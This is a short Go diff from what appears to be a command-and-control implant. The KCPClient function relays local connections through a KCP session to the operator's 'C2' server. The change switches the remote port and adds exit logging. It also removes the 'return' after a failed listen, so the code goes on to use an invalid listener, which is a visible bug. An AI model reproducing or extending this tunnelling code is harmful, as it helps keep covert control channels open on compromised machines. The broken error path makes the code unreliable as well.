@@ -21,14 +21,16 @@ func KCPClient() {
 	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.KCPPort))
 	if err != nil {
 		log.Printf("KCPClient: %v", err)
-		return
 	}
-	defer ln.Close()
+	defer func() {
+		ln.Close()
+		log.Print("KCPClient exited")
+	}()
 
 	serve_conn := func(client_conn net.Conn) {
 		// dial to C2 KCP server
 		sess, err := kcp.DialWithOptions(fmt.Sprintf("%s:%s",
-			RuntimeConfig.CCHost, RuntimeConfig.CCPort),
+			RuntimeConfig.CCHost, RuntimeConfig.KCPPort),
 			block, 10, 3)
 		defer sess.Close()
 		defer client_conn.Close()
